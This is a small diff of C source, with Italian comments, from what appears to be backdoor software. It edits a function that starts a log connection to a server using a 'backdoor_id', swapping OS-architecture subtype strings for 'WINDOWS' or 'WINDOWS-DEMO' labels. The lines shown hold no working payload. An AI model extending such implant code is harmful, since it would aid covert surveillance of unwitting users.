@@ -1438,10 +1438,14 @@ BOOL LOG_StartLogConnection(char *asp_server, char *backdoor_id, BOOL *uninstall
 	}
 
 	// Seleziona il subtype
-	if (IsX64System()) 
+	/*if (IsX64System()) 
 		_snprintf_s(subtype, sizeof(subtype), _TRUNCATE, "WIN64");		
 	else
-		_snprintf_s(subtype, sizeof(subtype), _TRUNCATE, "WIN32");
+		_snprintf_s(subtype, sizeof(subtype), _TRUNCATE, "WIN32");*/
+	if (is_demo_version) 
+		_snprintf_s(subtype, sizeof(subtype), _TRUNCATE, "WINDOWS-DEMO");		
+	else
+		_snprintf_s(subtype, sizeof(subtype), _TRUNCATE, "WINDOWS");
 
 	// Seleziona l'instance_id univoco
 	if (!GetUserUniqueHash((BYTE *)instance_id, sizeof(instance_id))) {
